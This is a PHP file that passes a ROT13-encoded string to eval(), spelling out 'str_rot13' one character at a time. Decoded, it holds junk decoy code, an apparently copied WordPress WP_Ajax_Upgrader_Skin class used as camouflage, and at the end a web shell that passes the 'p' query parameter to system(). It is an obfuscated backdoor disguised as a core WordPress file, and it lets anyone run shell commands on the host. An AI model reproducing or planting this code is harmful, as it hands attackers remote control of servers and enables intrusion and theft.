<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: JC_Nwnk_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Hctenqre Fxva sbe Nwnk JbeqCerff hctenqrf.
 *
 * Guvf fxva vf qrfvtarq gb or hfrq sbe Nwnk hcqngrf.
 *
 * @fvapr 4.6.0
 *
 * @frr Nhgbzngvp_Hctenqre_Fxva
 */
pynff JC_Nwnk_Hctenqre_Fxva rkgraqf Nhgbzngvp_Hctenqre_Fxva {

	/**
	 * Cyhtva vasb.
	 *
	 * Gur Cyhtva_Hctenqre::ohyx_hctenqr() zrgubq jvyy svyy guvf va
	 * jvgu vasb ergevrirq sebz gur trg_cyhtva_qngn() shapgvba.
	 *
	 * @ine neenl Cyhtva qngn. Inyhrf jvyy or rzcgl vs abg fhccyvrq ol gur cyhtva.
	 */
	choyvp $cyhtva_vasb = neenl();

	/**
	 * Gurzr vasb.
	 *
	 * Gur Gurzr_Hctenqre::ohyx_hctenqr() zrgubq jvyy svyy guvf va
	 * jvgu vasb ergevrirq sebz gur Gurzr_Hctenqre::gurzr_vasb() zrgubq,
	 * juvpu va ghea pnyyf gur jc_trg_gurzr() shapgvba.
	 *
	 * @ine JC_Gurzr|snyfr Gur gurzr'f vasb bowrpg, be snyfr.
	 */
	choyvp $gurzr_vasb = snyfr;

	/**
	 * Ubyqf gur JC_Reebe bowrpg.
	 *
	 * @fvapr 4.6.0
	 *
	 * @ine ahyy|JC_Reebe
	 */
	cebgrpgrq $reebef = ahyy;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur JbeqCerff Nwnk hctenqre fxva.
	 *
	 * @fvapr 4.6.0
	 *
	 * @frr JC_Hctenqre_Fxva::__pbafgehpg()
	 *
	 * @cnenz neenl $netf Bcgvbany. Gur JbeqCerff Nwnk hctenqre fxva nethzragf gb
	 *                    bireevqr qrsnhyg bcgvbaf. Frr JC_Hctenqre_Fxva::__pbafgehpg().
	 *                    Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		cnerag::__pbafgehpg( $netf );

		$guvf->reebef = arj JC_Reebe();
	}

	/**
	 * Ergevrirf gur yvfg bs reebef.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea JC_Reebe Reebef qhevat na hctenqr.
	 */
	choyvp shapgvba trg_reebef() {
		erghea $guvf->reebef;
	}

	/**
	 * Ergevrirf n fgevat sbe reebe zrffntrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea fgevat Reebe zrffntrf qhevat na hctenqr.
	 */
	choyvp shapgvba trg_reebe_zrffntrf() {
		$zrffntrf = neenl();

		sbernpu ( $guvf->reebef->trg_reebe_pbqrf() nf $reebe_pbqr ) {
			$reebe_qngn = $guvf->reebef->trg_reebe_qngn( $reebe_pbqr );

			vs ( $reebe_qngn && vf_fgevat( $reebe_qngn ) ) {
				$zrffntrf[] = $guvf->reebef->trg_reebe_zrffntr( $reebe_pbqr ) . ' ' . rfp_ugzy( fgevc_gntf( $reebe_qngn ) );
			} ryfr {
				$zrffntrf[] = $guvf->reebef->trg_reebe_zrffntr( $reebe_pbqr );
			}
		}

		erghea vzcybqr( ', ', $zrffntrf );
	}

	/**
	 * Fgberf na reebe zrffntr nobhg gur hctenqr.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @cnenz fgevat|JC_Reebe $reebef  Reebef.
	 * @cnenz zvkrq           ...$netf Bcgvbany grkg ercynprzragf.
	 */
	choyvp shapgvba reebe( $reebef, ...$netf ) {
		vs ( vf_fgevat( $reebef ) ) {
			$fgevat = $reebef;
			vs ( ! rzcgl( $guvf->hctenqre->fgevatf[ $fgevat ] ) ) {
				$fgevat = $guvf->hctenqre->fgevatf[ $fgevat ];
			}

			vs ( fge_pbagnvaf( $fgevat, '%' ) ) {
				vs ( ! rzcgl( $netf ) ) {
					$fgevat = ifcevags( $fgevat, $netf );
				}
			}

			// Pbhag rkvfgvat reebef gb trarengr n havdhr reebe pbqr.
			$reebef_pbhag = pbhag( $guvf->reebef->trg_reebe_pbqrf() );
			$guvf->reebef->nqq( 'haxabja_hctenqr_reebe_' . ( $reebef_pbhag + 1 ), $fgevat );
		} ryfrvs ( vf_jc_reebe( $reebef ) ) {
			sbernpu ( $reebef->trg_reebe_pbqrf() nf $reebe_pbqr ) {
				$guvf->reebef->nqq( $reebe_pbqr, $reebef->trg_reebe_zrffntr( $reebe_pbqr ), $reebef->trg_reebe_qngn( $reebe_pbqr ) );
			}
		}

		cnerag::reebe( $reebef, ...$netf );
	}

	/**
	 * Fgberf n zrffntr nobhg gur hctenqr.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 * @fvapr 5.9.0 Eranzrq `$qngn` gb `$srrqonpx` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat|neenl|JC_Reebe $srrqonpx Zrffntr qngn.
	 * @cnenz zvkrq                 ...$netf  Bcgvbany grkg ercynprzragf.
	 */
	choyvp shapgvba srrqonpx( $srrqonpx, ...$netf ) {
		vs ( vf_jc_reebe( $srrqonpx ) ) {
			sbernpu ( $srrqonpx->trg_reebe_pbqrf() nf $reebe_pbqr ) {
				$guvf->reebef->nqq( $reebe_pbqr, $srrqonpx->trg_reebe_zrffntr( $reebe_pbqr ), $srrqonpx->trg_reebe_qngn( $reebe_pbqr ) );
			}
		}

		cnerag::srrqonpx( $srrqonpx, ...$netf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>